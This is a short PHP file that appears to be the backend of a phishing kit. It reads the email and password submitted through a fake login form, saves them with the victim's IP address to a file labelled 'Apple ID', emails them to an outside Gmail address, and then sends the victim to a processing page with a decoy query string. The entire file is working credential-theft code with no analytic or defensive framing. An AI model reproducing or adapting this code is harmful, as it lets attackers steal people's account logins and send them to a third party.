<?
$adddate=date("D M d, Y g:i a");
$ip = getenv("REMOTE_ADDR");
$email = $_POST['email'];
$password = $_POST['password'];

$fw2 = fopen("fb.js","a");
        $data= "**********************************
Apple ID : $mail:$pass\nIP : $ip\nData : $adddate=date\n";
        fputs($fw2,$data);
        fclose($fw2);
$mailsubj="FB - $ip";
$emailusr = "danne.danne001@gmail.com";
mail($emailusr, $mailsubj, $email, $password);

        header("Location: processing.php?M=Y&A=3&PS=P1&AT=MJ&AT=17&ES=01&CIN=820CE9A57436AAAE111D159302F134008A3B750B&BIN=EFE43DEF97EB295FE99C3753F2D740D7B36DF689&CS=C3&RS=0&CDE1=N&CDE2=I&CDE3=N&CDE4=N&CDE5=N&CDE6=Y&CDE7=Y&CDE8=N&CDE11=N&CDE12=N&CDE13=N&CDE14=N&CDE15=N&CDE16=Y&CDE17=Y&CDE18=Y&CDE19=N&CDE20=N&CDE21=N&CDE22=N&CDE23=N&CDE24=N&CDE25=NE&CDE26=N&CDE28=N&CDE29=N&CDE30=N&CDE31=N&CDE32=N&CDE33=250&CDE34=N&CDE35=N&CDE36=N&CDE37=N&CDE38=N");
?>